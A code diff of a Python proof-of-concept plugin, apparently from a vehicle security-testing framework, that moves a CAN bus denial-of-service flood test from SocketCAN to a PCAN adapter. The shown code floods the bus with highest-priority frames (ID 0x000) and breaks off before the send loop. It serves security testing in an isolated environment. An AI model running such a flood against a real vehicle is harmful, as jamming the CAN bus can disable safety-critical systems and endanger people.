@@ -1,13 +1,13 @@
 """
 PoC Name: CAN Bus DoS Flood
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: CAN Bus (PCAN)
+Category: Protocol
 Severity: High
 CVSS: 7.5
-Description: 高优先级CAN帧洪泛测试总线拒绝服务风险
-Prerequisites: SocketCAN接口, python-can库, 隔离测试环境。
-Usage: python3 24_CAN_DoS_Flood.py <can_interface>
+Description: 通过高频发送高优先级CAN帧,测试总线是否存在拒绝服务风险。
+Prerequisites: PCAN接口, python-can库, PCAN驱动, 隔离测试环境。
+Usage: python3 24_CAN_DoS_Flood.py PCAN_USBBUS1
 """
 import sys
 import time
@@ -15,14 +15,19 @@ from iv_plugin_base import IVIVulnerabilityPlugin
 
 class CANDoSFloodPlugin(IVIVulnerabilityPlugin):
     def check_prerequisites(self):
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
+        self.logger.info(f"使用CAN接口: {iface}")
         return True
 
     def exploit(self):
-        iface = self.params.get("can_interface", "can0")
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
         self.logger.info(f"CAN DoS测试 ({iface}), 发送2秒高优先级帧...")
         try:
             import can
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
             flood_msg = can.Message(
                 arbitration_id=0x000,  # Highest priority
                 data=[0xFF]*8, is_extended_id=False
